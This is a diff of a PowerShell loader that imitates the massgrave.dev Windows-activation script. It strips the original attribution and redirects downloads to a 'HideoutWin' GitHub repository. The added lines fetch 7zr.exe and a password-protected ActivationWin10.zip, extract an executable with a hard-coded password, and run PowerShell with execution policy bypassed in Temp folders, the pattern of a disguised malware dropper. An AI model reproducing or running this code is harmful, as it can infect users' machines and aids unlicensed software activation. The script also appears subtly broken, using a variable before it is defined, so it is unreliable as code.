@@ -1,21 +1,20 @@
-# The following get.ps1 code is hosted on get.activated.win for massgrave.dev. For more info, please visit massgrave.dev.
-
 $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients for current session
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $DownloadURL1 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/win.cmd'
-$DownloadURL2 = 'https://raw.githubusercontent.com/HideoutWin/windows/main/win.cmd'
 
-$URLs = @($DownloadURL1, $DownloadURL2)
+$URLs = @($DownloadURL1)
 $RandomURL1 = Get-Random -InputObject $URLs
 $RandomURL2 = ($URLs -ne $RandomURL1)[0]
 
+$FilePath4 = if ($isAdmin) { "$env:SystemRoot\Temp\" } else { "$env:TEMP\" }
+
 try {
-    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing
+    $response = Invoke-WebRequest -Uri $RandomURL1 -UseBasicParsing -OutFile $FilePath4
 }
 catch {
-    $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing
+    $response = Invoke-WebRequest -Uri $RandomURL2 -UseBasicParsing -OutFile $FilePath4
 }
 
 # Verify script integrity
@@ -32,9 +31,9 @@ $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -mat
 $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
 $FilePath2 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.zip" } else { "$env:TEMP\ActivationWin10.zip" }
 $FilePath3 = if ($isAdmin) { "$env:SystemRoot\Temp\7zr.exe" } else { "$env:TEMP\7zr.exe" }
-$FilePath4 = if ($isAdmin) { "$env:SystemRoot\Temp\" } else { "$env:TEMP\" }
 $FilePath5 = if ($isAdmin) { "$env:SystemRoot\Temp\ActivationWin10.exe" } else { "$env:TEMP\ActivationWin10.exe" }
 
+cd $FilePath4
 powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://www.7-zip.org/a/7zr.exe' -OutFile '$FilePath3'"
 powershell -ExecutionPolicy Bypass -c "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/HideoutWin/windows/raw/main/ActivationWin10.zip' -OutFile '$FilePath2'; ./7zr.exe x -p@Activation#85320878 ActivationWin10.zip ActivationWin10.exe"
 
